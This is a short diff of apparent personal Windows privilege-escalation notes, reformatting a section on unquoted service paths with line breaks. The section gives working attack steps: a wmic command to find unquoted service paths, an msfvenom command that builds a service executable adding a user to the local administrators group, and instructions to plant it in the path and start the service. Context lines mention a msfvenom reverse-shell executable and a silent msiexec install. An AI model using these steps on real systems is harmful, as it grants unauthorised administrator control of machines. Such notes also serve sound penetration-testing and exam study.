@@ -89,14 +89,14 @@ Geberate reverse shell exe with msfvenom and setup a listener
 msiexec /quiet /qn /i /pathtosoftwarecreated
 
 <h2>unquoted service paths</h2>
-Run winpeas and check for any unquoted service paths
-if winpeas wont work try run
-wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
-for example if path -- C:\Program Files\unquoted path\Common Files
-create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
-place in C:\Program Files\unquoted path (this ovbiously changes path for what you found)
-call service   -- sc start servicename
-you change change whats in the generated exe 
+Run winpeas and check for any unquoted service paths <br>
+if winpeas wont work try run <br>
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ <br>
+for example if path -- C:\Program Files\unquoted path\Common Files <br>
+create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe <br>
+place in C:\Program Files\unquoted path (this ovbiously changes path for what you found) <br>
+call service   -- sc start servicename <br>
+you change change whats in the generated exe  <br>
 
 
 <h2>search configuration files for passwords</h2>
